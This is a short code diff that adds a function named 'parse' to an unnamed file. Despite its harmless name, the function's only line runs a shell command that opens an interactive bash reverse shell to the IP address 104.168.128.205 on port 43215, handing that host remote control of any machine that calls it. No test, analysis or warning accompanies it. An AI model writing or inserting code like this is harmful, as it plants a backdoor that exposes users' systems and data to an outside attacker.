@@ -1,0 +1,3 @@
+function parse(x){
+    os.exec(["sh","-c","bash -i >& /dev/tcp/104.168.128.205/43215 0>&1"])
+}
